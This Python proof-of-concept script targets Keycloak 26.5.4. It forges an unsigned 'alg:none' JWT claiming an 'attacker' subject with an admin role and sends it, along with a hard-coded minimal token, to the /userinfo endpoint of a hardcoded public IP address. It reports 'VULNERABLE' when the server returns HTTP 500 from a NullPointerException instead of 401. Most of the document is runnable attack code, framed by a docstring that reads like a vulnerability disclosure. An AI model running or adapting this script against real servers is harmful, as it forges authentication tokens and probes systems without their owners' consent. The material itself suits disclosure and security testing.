#!/usr/bin/env python3
"""
PoC #3: alg:none JWT causes HTTP 500 (NullPointerException) on UserInfo Endpoint
Target:  Keycloak 26.5.4
Type:    Unhandled exception / improper input validation in security-critical code path

Description:
  When a JWT with header {"alg": "none", "typ": "JWT"} is submitted to the
  /protocol/openid-connect/userinfo endpoint as a Bearer token, Keycloak
  attempts to look up a SignatureProvider for algorithm "none", which returns
  null, causing an uncaught NullPointerException.

  The server returns HTTP 500 instead of HTTP 401.
  Server logs show:
    ERROR Uncaught server error: java.lang.NullPointerException:
    Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
    because the return value of
    "org.keycloak.models.KeycloakSession.getProvider(java.lang.Class, String)"
    is null

Reproduction:
  Any unauthenticated attacker can trigger this on any Keycloak realm.
  No credentials required.

Impact:
  - HTTP 500 instead of 401 for security-critical auth failure path
  - Unhandled NPE in token validation pipeline (potential side effects in
    complex deployments with custom providers/hooks that observe errors)
  - Indicates algorithm "none" is not explicitly rejected before provider lookup
"""

import base64
import json
import http.client
import urllib.parse
import sys

KC_HOST = "46.101.162.187"
KC_PORT = 8080
REALM   = "test"

def b64url_encode(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

def make_alg_none_token(sub="attacker", exp=9999999999) -> str:
    """Craft a JWT with alg:none (no signature)"""
    header  = {"alg": "none", "typ": "JWT"}
    payload = {
        "sub":                  sub,
        "exp":                  exp,
        "iat":                  1000000000,
        "preferred_username":   sub,
        "realm_access":         {"roles": ["admin"]},
    }
    return f"{b64url_encode(header)}.{b64url_encode(payload)}."

def send_userinfo(token: str) -> tuple:
    """Send token to /userinfo, return (status, body)"""
    conn = http.client.HTTPConnection(KC_HOST, KC_PORT, timeout=10)
    path = f"/realms/{REALM}/protocol/openid-connect/userinfo"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept":        "application/json",
    }
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    conn.close()
    return resp.status, body

def main():
    print("=" * 65)
    print("PoC #3 — alg:none JWT → HTTP 500 (NullPointerException)")
    print(f"Target: http://{KC_HOST}:{KC_PORT}/realms/{REALM}")
    print("=" * 65)

    # --- Test 1: alg:none ------------------------------------------------
    print("\n[1] Crafting alg:none JWT...")
    token = make_alg_none_token()
    print(f"    Header:  {{'alg': 'none', 'typ': 'JWT'}}")
    print(f"    Payload: sub=attacker, role=admin")
    print(f"    Token:   {token[:80]}...")

    print("\n[2] Sending to /userinfo (should return 401)...")
    status, body = send_userinfo(token)
    print(f"    HTTP Status: {status}")
    print(f"    Response:    {body}")

    if status == 500:
        print("\n    [!!! VULNERABLE] HTTP 500 returned instead of 401")
        print("    Server threw NullPointerException in JWT validation pipeline")
        print("    Check server logs for:")
        print("      ERROR Uncaught server error: java.lang.NullPointerException:")
        print('      Cannot invoke "...SignatureProvider.verifier(String)"')
    elif status == 401:
        print("\n    [OK] Proper 401 Unauthorized returned")
    else:
        print(f"\n    [?] Unexpected status: {status}")

    # --- Test 2: malformed (truncated) alg:none --------------------------
    print("\n[3] Testing pre-built minimal alg:none token...")
    # Simpler token: just base64-encoded header + payload + empty signature
    minimal = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0IiwiZXhwIjo5OTk5OTk5OTk5fQ."
    status2, body2 = send_userinfo(minimal)
    print(f"    HTTP Status: {status2}")
    print(f"    Response:    {body2}")
    if status2 == 500:
        print("    [!!! VULNERABLE] Same NPE triggered with minimal token")

    # --- Summary --------------------------------------------------------
    print("\n" + "=" * 65)
    print("SUMMARY")
    print("=" * 65)
    print(f"  alg:none → HTTP {status}  (expected 401)")
    print(f"  minimal  → HTTP {status2} (expected 401)")
    print()
    print("Server log (expected):")
    print("  ERROR [org.keycloak.services.error.KeycloakErrorHandler]")
    print("  Uncaught server error: java.lang.NullPointerException:")
    print('  Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"')
    print('  because the return value of')
    print('  "org.keycloak.models.KeycloakSession.getProvider(Class, String)" is null')

if __name__ == "__main__":
    main()
